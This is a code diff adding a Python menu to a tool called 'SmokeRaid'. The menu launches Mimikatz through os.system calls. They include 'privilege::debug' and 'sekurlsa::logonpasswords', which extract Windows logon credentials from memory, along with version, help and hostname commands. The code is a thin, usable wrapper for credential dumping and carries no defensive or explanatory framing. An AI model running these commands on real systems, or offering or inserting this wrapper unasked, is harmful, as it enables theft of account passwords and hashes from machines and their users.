@@ -184,9 +184,99 @@ def allprefetch():
 
 
 
+# Run Mimikatz Here
 
 
 
+def mimikatz():
+
+    print ("""
+   {1}--Mimikatz Commands
+   {2}--Version Information
+   {3}--Privilage Debug
+   {4}--Hostname Information
+   {5}--Logon Password Details
+   {0}--Back to Main Menu
+   {99}--Exit
+ """)
+    choice = input("SmokeRaid~# ")
+    if choice == "1":
+        mimihelp()
+    elif choice == "2":
+        versioninfo()
+    elif choice == "3":
+        privide()
+    elif choice == "4":
+        hostinfo()
+    elif choice == "5":
+        logonpass()
+    elif choice == "0":
+        os.system('cls')
+        print(logo)
+        mainmenu()
+    elif choice == "99":
+        print("Thanks for Using SmokeRaid")
+        os.system('cls'), sys.exit()
+    elif choice == "":
+        print("\033[1m [+] Kindly Choose One Option \033[0m")
+        mimikatz()
+    else:
+        print(logo)
+        mainmenu()
+
+
+
+# Run mimikatz commands
+
+def mimihelp():
+
+    os.system('cls')
+    print(logo)
+    print ("[+] Mimikatz | Find Commnads : \n")
+
+    os.system('mimikatz.exe help')
+
+    mimikatz()
+
+def versioninfo():
+
+    os.system('cls')
+    print(logo)
+    print ("[+] Mimikatz | Find Version Information : \n")
+
+    os.system('mimikatz.exe version')
+    
+    mimikatz()
+
+def privide():
+
+    os.system('cls')
+    print(logo)
+    print ("[+] Mimikatz | Privilege Debug Mode : \n")
+
+    os.system('mimikatz.exe privilege::debug')
+   
+    mimikatz()
+
+def hostinfo():
+
+    os.system('cls')
+    print(logo)
+    print ("[+] Mimikatz | Find Hostname : \n")
+
+    os.system('mimikatz.exe hostname')
+    
+    mimikatz()
+
+def logonpass():
+
+    os.system('cls')
+    print(logo)
+    print ("[+] Mimikatz | Find Logon Password : \n")
+
+    os.system('mimikatz.exe sekurlsa::logonpasswords')
+    
+    mimikatz()
 
 # Call main menu to run program
 mainmenu()
